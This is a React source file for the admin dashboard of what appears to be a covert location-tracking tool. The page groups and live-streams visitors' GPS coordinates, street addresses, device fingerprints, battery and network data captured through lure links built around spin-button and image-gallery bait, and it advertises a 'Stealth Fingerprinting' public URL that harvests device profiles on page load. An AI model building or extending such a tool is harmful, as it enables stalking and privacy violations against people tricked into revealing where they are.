import React, { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import { MapPin, RefreshCw, ExternalLink, User, Fingerprint, ChevronRight, Wifi, ChevronDown, ChevronUp, Link2, Image } from 'lucide-react';
import { io } from 'socket.io-client';
import Card from '../components/common/Card';
import Button from '../components/common/Button';
import Table from '../components/common/Table';
import { api, baseURL } from '../services/api/client';
import { toast } from 'react-hot-toast';
import { useNavigate } from 'react-router-dom';

const PublicLocationsPage = () => {
  const navigate = useNavigate();
  const [locations, setLocations] = useState([]);
  const [isLoading, setIsLoading] = useState(true);
  const [isRefreshing, setIsRefreshing] = useState(false);
  const [filterVisitorId, setFilterVisitorId] = useState(null);
  const [isConnected, setIsConnected] = useState(false);
  const [liveUpdates, setLiveUpdates] = useState(0);
  const [expandedLinks, setExpandedLinks] = useState(new Set());

  // Group locations by tracking link slug
  const groupByTrackingLink = (locations) => {
    const groups = {};
    locations.forEach(loc => {
      const key = loc.trackingLinkSlug || 'direct';
      if (!groups[key]) {
        groups[key] = [];
      }
      groups[key].push(loc);
    });
    return groups;
  };

  const toggleExpand = (linkSlug) => {
    const newExpanded = new Set(expandedLinks);
    if (newExpanded.has(linkSlug)) {
      newExpanded.delete(linkSlug);
    } else {
      newExpanded.add(linkSlug);
    }
    setExpandedLinks(newExpanded);
  };

  // The capture page is on the backend. BaseURL usually has /api at the end.
  const publicCaptureUrl = baseURL.replace('/api', '') + '/public/capture';

  const fetchLocations = async () => {
    setIsRefreshing(true);
    try {
      const response = await api.get('/public/all-locations');
      if (response.data.success) {
        setLocations(response.data.data);
      } else {
        toast.error('Failed to fetch locations');
      }
    } catch (error) {
      console.error('Error fetching locations:', error);
      toast.error('Error connecting to server');
    } finally {
      setIsLoading(false);
      setIsRefreshing(false);
    }
  };

  useEffect(() => {
    fetchLocations();

    // Socket.IO Connection for live updates
    const socketUrl = baseURL.replace('/api', '');
    const token = localStorage.getItem('token');
    
    const socket = io(socketUrl, {
      auth: { token },
      transports: ['websocket', 'polling']
    });

    socket.on('connect', () => {
      console.log('Socket connected:', socket.id);
      setIsConnected(true);
      // Join admin room
      socket.emit('admin:join');
    });

    socket.on('disconnect', () => {
      console.log('Socket disconnected');
      setIsConnected(false);
    });

    socket.on('admin:joined', (data) => {
      if (data.success) {
        console.log('Joined admin room');
        toast.success('Live tracking enabled');
      }
    });

    // Listen for new location captures
    socket.on('location:captured', (data) => {
      console.log('New location captured:', data);
      setLiveUpdates(prev => prev + 1);
      
      setLocations(prevLocations => {
        const newLocation = {
          _id: Date.now().toString(),
          visitorId: data.visitorId,
          ip: data.ip,
          location: data.location,
          accuracy: data.accuracy,
          method: data.method,
          capturedAt: data.createdAt,
          address: data.address,
          screenResolution: data.screenResolution,
          batteryLevel: data.batteryLevel,
          networkType: data.networkType,
          deviceInfo: data.deviceInfo,
          networkInfo: data.networkInfo,
          language: data.language,
          timezone: data.timezone,
          isLive: true
        };
        return [newLocation, ...prevLocations];
      });

      const locationText = data.address?.displayAddress || 'Unknown location';
      toast.success(`Tracked: ${locationText.substring(0, 30)}...`, {
        icon: '📍',
        duration: 3000
      });
    });

    // Listen for tracking journey events
    socket.on('tracking:event', (data) => {
      console.log('Tracking event:', data);
      setLiveUpdates(prev => prev + 1);
      
      setLocations(prevLocations => {
        const existingIndex = prevLocations.findIndex(l => l.visitorId === data.visitorId);
        
        if (existingIndex >= 0) {
          // Update existing record
          const updated = [...prevLocations];
          updated[existingIndex] = {
            ...updated[existingIndex],
            trackingJourney: {
              ...updated[existingIndex].trackingJourney,
              journeyStatus: data.journeyStatus,
              permissionStatus: data.permissionStatus,
              ...(data.event === 'spin_button_clicked' && { spinButtonClickedAt: data.timestamp }),
              ...(data.event === 'permission_requested' && { permissionRequestedAt: data.timestamp }),
              ...(data.event === 'permission_result' && { 
                permissionStatus: data.permissionStatus,
                permissionErrorMessage: data.permissionErrorMessage 
              }),
              ...(data.event === 'location_attempt' && { 
                locationAttempts: (updated[existingIndex].trackingJourney?.locationAttempts || 0) + 1 
              }),
              ...(data.event === 'location_captured' && { locationCapturedAt: data.timestamp }),
              ...(data.event === 'spin_completed' && { spinCompletedAt: data.timestamp }),
            },
            isLive: true
          };
          return updated;
        } else {
          // Create new record with partial data
          return [{
            _id: Date.now().toString(),
            visitorId: data.visitorId,
            ip: data.ip,
            location: { coordinates: [0, 0] },
            trackingJourney: {
              journeyStatus: data.journeyStatus,
              permissionStatus: data.permissionStatus
            },
            screenResolution: data.deviceInfo?.screenResolution,
            language: data.deviceInfo?.language,
            timezone: data.deviceInfo?.timezone,
            trackingLinkSlug: data.trackingLinkSlug,
            isLive: true
          }, ...prevLocations];
        }
      });

      // Show toast for important events
      if (data.event === 'view_images_clicked' || data.event === 'spin_button_clicked') {
        toast('🎰 Button clicked', { icon: '🎯', duration: 2000 });
      } else if (data.event === 'page_load') {
        toast('📱 New visitor', { icon: '👋', duration: 2000 });
      } else if (data.event === 'permission_result') {
        if (data.permissionStatus === 'denied') {
          toast.error('❌ Location permission denied', { duration: 3000 });
        } else if (data.permissionStatus === 'granted') {
          toast.success('✅ Permission granted', { duration: 2000 });
        }
      }
    });

    return () => {
      socket.disconnect();
    };
  }, []);

  const filteredLocations = filterVisitorId 
    ? locations.filter(l => l.visitorId === filterVisitorId)
    : locations;

  // Prepare grouped data for table - grouped by tracking link
  const prepareTableData = () => {
    const groups = groupByTrackingLink(filteredLocations);
    const result = [];
    
    Object.entries(groups).forEach(([linkSlug, groupLocations]) => {
      // Sort by date, newest first
      groupLocations.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
      
      // Add main row with count
      const mainRow = {
        ...groupLocations[0],
        _linkSlug: linkSlug,
        _linkCount: groupLocations.length,
        _isGroupHeader: true
      };
      result.push(mainRow);
      
      // Add child rows if expanded
      if (expandedLinks.has(linkSlug) && groupLocations.length > 1) {
        groupLocations.slice(1).forEach((loc, index) => {
          result.push({
            ...loc,
            _isChildRow: true,
            _childIndex: index + 1,
            _linkSlug: linkSlug
          });
        });
      }
    });
    
    return result;
  };

  const tableData = prepareTableData();

  const columns = [
    {
      header: 'Via Link',
      render: (row) => {
        const linkCount = row._linkCount || 1;
        const isGroup = linkCount > 1;
        const isExpanded = expandedLinks.has(row._linkSlug);
        const isChild = row._isChildRow;
        const linkSlug = row._linkSlug || row.trackingLinkSlug || 'direct';
        const isDirect = linkSlug === 'direct';
        
        return (
          <div className={`flex flex-col group ${isChild ? 'ml-8 opacity-80' : ''}`}>
            <div className="flex items-center space-x-2">
              {isGroup && !isChild && (
                <button 
                  onClick={() => toggleExpand(linkSlug)}
                  className="p-1 hover:bg-gray-100 rounded transition-colors"
                >
                  {isExpanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                </button>
              )}
              {isChild && <span className="w-6" />}
              <span className={`px-2 py-0.5 rounded text-xs font-medium ${isDirect ? 'bg-gray-100 text-gray-600' : 'bg-purple-100 text-purple-700'}`}>
                {isDirect ? 'Direct' : `/xxx/${linkSlug}`}
              </span>
              {isGroup && !isChild && (
                <span className="ml-2 px-1.5 py-0.5 bg-blue-100 text-blue-700 text-[10px] rounded-full">
                  {linkCount}
                </span>
              )}
              {isChild && (
                <span className="ml-2 text-[10px] text-gray-400">
                  #{row._childIndex}
                </span>
              )}
            </div>
            {!isDirect && (
              <div className={`flex items-center mt-1 space-x-1 ${isChild ? 'ml-0' : 'ml-6'}`}>
                <Fingerprint className="w-3 h-3 text-socius-red" />
                <span className="text-[10px] font-mono text-gray-400">ID: {row.visitorId?.substring(0, 10) || 'N/A'}</span>
              </div>
            )}
          </div>
        );
      },
    },
    {
      header: 'Captured At',
      render: (row) => (
        <div className="flex flex-col">
          <div className="flex items-center gap-2">
            <span className="text-sm text-gray-900 dark:text-white">
              {new Date(row.capturedAt).toLocaleString()}
            </span>
            {row.isLive && (
              <span className="px-1.5 py-0.5 bg-green-100 text-green-700 text-[10px] font-bold rounded animate-pulse">
                NEW
              </span>
            )}
          </div>
          <div className="flex items-center mt-1 space-x-2">
            <span className={`text-[10px] px-1.5 py-0.5 rounded-full font-bold uppercase ${row.method === 'geolocation' ? 'bg-green-100 text-green-700' : 'bg-blue-100 text-blue-700'}`}>
              {row.method || 'GPS'}
            </span>
            {row.behavioralData?.totalClicks > 0 && (
              <span className="text-[10px] bg-purple-100 text-purple-700 px-1.5 py-0.5 rounded-full font-bold">
                {row.behavioralData.totalClicks} CLICKS
              </span>
            )}
          </div>
        </div>
      ),
    },
    {
      header: 'Journey Status',
      render: (row) => {
        const journey = row.trackingJourney || {};
        const getStatusColor = (status) => {
          switch (status) {
            case 'completed': return 'bg-green-500';
            case 'location_captured': return 'bg-green-400';
            case 'permission_granted': return 'bg-blue-500';
            case 'permission_denied': return 'bg-red-500';
            case 'failed': return 'bg-gray-500';
            default: return 'bg-yellow-400';
          }
        };
        
        const steps = [
          { label: 'Load', done: !!journey.pageLoadedAt },
          { label: 'Click', done: !!journey.spinButtonClickedAt },
          { label: 'Permission', done: journey.permissionStatus === 'granted', failed: journey.permissionStatus === 'denied' },
          { label: 'Location', done: !!journey.locationCapturedAt },
          { label: 'Done', done: journey.journeyStatus === 'completed' }
        ];
        
        return (
          <div className="flex flex-col gap-1 min-w-[140px]">
            <div className="flex items-center gap-1">
              {steps.map((step, i) => (
                <div key={i} className="flex items-center">
                  <span 
                    className={`w-2 h-2 rounded-full ${
                      step.done ? 'bg-green-500' : step.failed ? 'bg-red-500' : 'bg-gray-300'
                    }`}
                    title={step.label}
                  />
                  {i < steps.length - 1 && (
                    <span className={`w-3 h-0.5 ${step.done ? 'bg-green-300' : 'bg-gray-200'}`} />
                  )}
                </div>
              ))}
            </div>
            <div className="flex items-center gap-1 text-[10px]">
              <span className={`w-1.5 h-1.5 rounded-full ${getStatusColor(journey.journeyStatus || 'page_loaded')}`} />
              <span className="text-gray-600 dark:text-gray-400">
                {(journey.journeyStatus || 'page_loaded').replace(/_/g, ' ')}
              </span>
              {journey.permissionStatus && journey.permissionStatus !== 'pending' && (
                <span className={`ml-1 px-1 py-0.5 rounded text-[9px] ${
                  journey.permissionStatus === 'granted' 
                    ? 'bg-green-100 text-green-700' 
                    : 'bg-red-100 text-red-700'
                }`}>
                  {journey.permissionStatus}
                </span>
              )}
            </div>
            {journey.locationAttempts > 0 && (
              <span className="text-[9px] text-gray-400">
                {journey.locationAttempts} attempt{journey.locationAttempts > 1 ? 's' : ''}
              </span>
            )}
          </div>
        );
      },
    },
    {
      header: 'Location',
      render: (row) => (
        <div className="flex flex-col space-y-1">
          <div className="flex items-center space-x-2">
            <MapPin className="w-4 h-4 text-socius-red" />
            <span className="text-sm font-mono bg-gray-100 dark:bg-gray-700 px-2 py-1 rounded">
              {row.location.coordinates[1].toFixed(6)}, {row.location.coordinates[0].toFixed(6)}
            </span>
            <a
              href={`https://www.google.com/maps?q=${row.location.coordinates[1]},${row.location.coordinates[0]}`}
              target="_blank"
              rel="noopener noreferrer"
              className="text-blue-500 hover:text-blue-700"
              title="View on Google Maps"
            >
              <ExternalLink className="w-4 h-4" />
            </a>
          </div>
          {row.accuracy && (
            <div className="flex items-center space-x-2">
              <div className={`h-2 w-2 rounded-full ${row.accuracy < 50 ? 'bg-green-500' : row.accuracy < 500 ? 'bg-yellow-500' : 'bg-red-500'}`}></div>
              <span className="text-xs text-gray-500">
                Acc: ±{Math.round(row.accuracy)}m 
              </span>
            </div>
          )}
        </div>
      ),
    },
    {
      header: 'Address',
      render: (row) => {
        // Shorten address - show only first 2-3 meaningful parts
        const fullAddress = row.address?.displayAddress || '';
        const parts = fullAddress.split(',').map(p => p.trim()).filter(p => p);
        // Take first 2 parts max (like "F117, Barahathawa-06")
        const shortAddress = parts.slice(0, 2).join(', ');
        
        return (
          <div className="flex flex-col max-w-[200px]">
            <span 
              className="text-sm text-gray-900 dark:text-white font-medium truncate" 
              title={fullAddress}
            >
              {shortAddress || 'Unknown'}
            </span>
            <div className="flex items-center gap-1 mt-0.5">
              {row.address?.city && (
                <span className="text-[10px] bg-blue-50 text-blue-600 dark:bg-blue-900/30 dark:text-blue-400 px-1.5 py-0.5 rounded">
                  {row.address.city}
                </span>
              )}
            </div>
          </div>
        );
      },
    },
    {
      header: 'Device Summary',
      render: (row) => (
        <div className="flex flex-col gap-1 text-[11px] text-gray-600 dark:text-gray-400">
          <div className="flex items-center gap-2">
            <span className="bg-gray-100 dark:bg-gray-700 px-1.5 py-0.5 rounded font-medium">
              {row.deviceInfo?.platform || 'Unknown'}
            </span>
            <span className="bg-gray-100 dark:bg-gray-700 px-1.5 py-0.5 rounded">
              {row.screenResolution || 'N/A'}
            </span>
          </div>
          <div className="flex items-center gap-2">
            <span>CPU: {row.deviceInfo?.cpuCores || '?'} cores</span>
            <span>RAM: {row.deviceInfo?.memory || '?'}GB</span>
          </div>
          <div className="flex items-center gap-2 text-[10px]">
            {row.batteryLevel && (
              <span className="text-green-600">
                🔋{Math.round(row.batteryLevel)}%
              </span>
            )}
            <span className="text-blue-600">
              {row.networkType || 'N/A'}
            </span>
            <span className="text-gray-500">
              {row.language?.substring(0, 2).toUpperCase()}
            </span>
            <span 
              className="ml-auto text-blue-500 hover:text-blue-700 cursor-pointer font-medium"
              onClick={() => navigate(`/public-locations/${row.visitorId || row.ip}`)}
            >
              Profile →
            </span>
          </div>
        </div>
      ),
    },
  ];

  return (
    <div className="relative">
      <div className="space-y-6 p-6">
        <div className="flex justify-between items-center">
          <div>
            <div className="flex items-center gap-3">
              <h1 className="text-2xl font-bold text-gray-900 dark:text-white">Advanced Device Tracking</h1>
              {isConnected && (
                <span className="flex items-center gap-1 px-2 py-1 bg-green-100 text-green-700 text-xs font-bold rounded-full animate-pulse">
                  <Wifi className="w-3 h-3" />
                  LIVE
                  {liveUpdates > 0 && (
                    <span className="ml-1 bg-green-600 text-white px-1.5 rounded-full text-[10px]">
                      {liveUpdates}
                    </span>
                  )}
                </span>
              )}
            </div>
            <p className="text-gray-500 dark:text-gray-400">Deep fingerprinting, behavioral analysis, and network forensics</p>
          </div>
          <div className="flex space-x-3">
            <Button
              variant="secondary"
              onClick={() => navigate('/gallery-settings')}
            >
              <Image className="w-4 h-4 mr-2" />
              Gallery Settings
            </Button>
            <Button
              variant="secondary"
              onClick={() => navigate('/tracking-links')}
            >
              <Link2 className="w-4 h-4 mr-2" />
              Tracking Links
            </Button>
            {filterVisitorId && (
              <Button
                variant="secondary"
                onClick={() => setFilterVisitorId(null)}
                className="text-socius-red border-socius-red/30"
              >
                Clear Filter
              </Button>
            )}
            <Button
              variant="secondary"
              onClick={fetchLocations}
              disabled={isRefreshing}
            >
              <RefreshCw className={`w-4 h-4 mr-2 ${isRefreshing ? 'animate-spin' : ''}`} />
              Refresh
            </Button>
          </div>
        </div>

        <Card className="p-4 bg-blue-50 dark:bg-blue-900/20 border-blue-200 dark:border-blue-800">
          <div className="flex flex-col md:flex-row md:items-center justify-between space-y-4 md:space-y-0">
            <div>
              <h3 className="text-sm font-semibold text-blue-800 dark:text-blue-300">Public Tracking URL (Stealth Fingerprinting Enabled)</h3>
              <p className="text-xs text-blue-600 dark:text-blue-400 mt-1">
                Captures full device profile and behavioral data on load.
              </p>
            </div>
            <div className="flex items-center space-x-2">
              <input
                readOnly
                value={publicCaptureUrl}
                className="bg-white dark:bg-gray-800 border border-blue-300 dark:border-blue-700 rounded px-3 py-2 text-sm w-full md:w-80 font-mono"
              />
              <Button
                variant="primary"
                size="sm"
                onClick={() => {
                  if (navigator.clipboard && navigator.clipboard.writeText) {
                    navigator.clipboard.writeText(publicCaptureUrl);
                    toast.success('URL copied to clipboard');
                  } else {
                    const textArea = document.createElement("textarea");
                    textArea.value = publicCaptureUrl;
                    document.body.appendChild(textArea);
                    textArea.select();
                    document.execCommand('copy');
                    document.body.removeChild(textArea);
                    toast.success('URL copied');
                  }
                }}
              >
                Copy
              </Button>
            </div>
          </div>
        </Card>

        <Card>
          <div className="p-4 border-b border-gray-100 dark:border-gray-800 flex justify-between items-center">
            <h2 className="text-lg font-semibold text-gray-900 dark:text-white">
              {filterVisitorId ? `History for Visitor: ${filterVisitorId.substring(0, 15)}...` : 'Tracked Devices'}
            </h2>
            <span className="text-sm text-gray-500">
              Total entries: {filteredLocations.length}
            </span>
          </div>
          <Table
            columns={columns}
            data={tableData}
            isLoading={isLoading}
            emptyMessage="No devices tracked yet."
          />
        </Card>
      </div>
    </div>
  );
};

export default PublicLocationsPage;
